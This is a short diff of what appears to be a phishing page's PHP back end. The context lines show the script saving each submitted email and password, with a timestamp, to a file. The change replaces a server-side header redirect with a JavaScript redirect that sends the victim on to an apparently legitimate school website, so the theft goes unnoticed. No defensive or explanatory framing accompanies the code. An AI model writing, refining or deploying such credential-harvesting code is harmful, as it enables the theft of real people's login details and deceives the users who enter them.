@@ -8,6 +8,10 @@ $txt = "email:".$email." \t "."password:".$pass." \t Date:".date("M,d,Y h:i:s A"
 fwrite($myfile, $txt);
 fclose($myfile);
 
-header("Location: http://www.hinhua.edu.my");
-
 ?>
+
+<html>
+<script type="text/javascript">
+window.location.replace("http://www.hinhua.edu.my");
+</script>
+</html>
